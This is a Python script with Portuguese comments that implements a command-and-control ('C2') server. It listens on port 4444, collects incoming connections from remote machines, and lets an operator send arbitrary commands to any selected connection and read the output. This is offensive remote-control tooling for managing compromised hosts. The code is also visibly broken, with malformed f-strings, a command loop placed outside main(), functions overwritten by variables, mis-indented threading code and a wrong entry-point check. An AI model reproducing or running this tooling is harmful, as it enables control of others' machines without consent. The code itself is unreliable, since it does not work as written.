import socket
import threading

# Lista de conexão e endereços
conexoes =[]
enderecos =[]

def handle_client(conn,addr):
  print ("f[+]Nova conexao de={addr}")
  conexoes.append(conn)
  enderecos.append(addr)
  try:
    while True:
     data = conn.recv(1024).decode()
     if not data:
        break
  except:
    pass
  finally:
    conn.close()
    conexoes.remove(conn)
    enderecos.remove(addr)
    print("f[-]Conexão encerrada:{addr}")

def main():
  host = "0.0.0.0"
  porta =4444
  server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  server.bind((host,porta))
  server.listen(9)
  print ("f[*]Serverdor C2 escutando em {host}:{porta}")

  # Thread para aceitar conexões
  threading.Thread(target=aceitar_conexoes,args=(server,)).start()

while True:
   comando=input("\n[C2]Comando ('listar' para ver conexões,'selecionar <n>'para escolher uma):")
   if comando=="listar":
       listar_conexoes=list()
   elif comando.startswith("selecionar"):                                                                                                                                             
    try:
       idx=int(comando.split()[1])
       interagir_conexao = interagir_conexao(idx)
    except:
       print("[-]índice inválido.")               
   elif comando=="sair":
      break

def aceitar_conexoes(server):
     while True:
      conn,addr = server.accept()
     thread = threading.Thread(target=handle_client,args=(conn,addr))
     thread.start()

def listar_conexoes():
 print("\n[+]Conexões ativas:")
 for i,addr in enumerate(enderecos):
   print("f{i}:{addr}")

def interagir_conexao(idx):
   try:
    conn = conexoes[idx]
    addr = enderecos[idx]
    print("f\n[+] Interagindo com:{addr}")
    while True:
     comando=input("fC2({addr}):")
     if comando.lower()=="sair":
      break
     if comando:
       conn.send(comando.encode())
       resposta=conn.recv(1024).decode()
     print("f{addr}>{resposta}")
   except IndexError:
     print("[-]Índice inválido.")
   except Exception as e:
     print("f[-]Erro ao interagir com a conexão:{str(e)}")

if __name__:'_main_'
main()

 

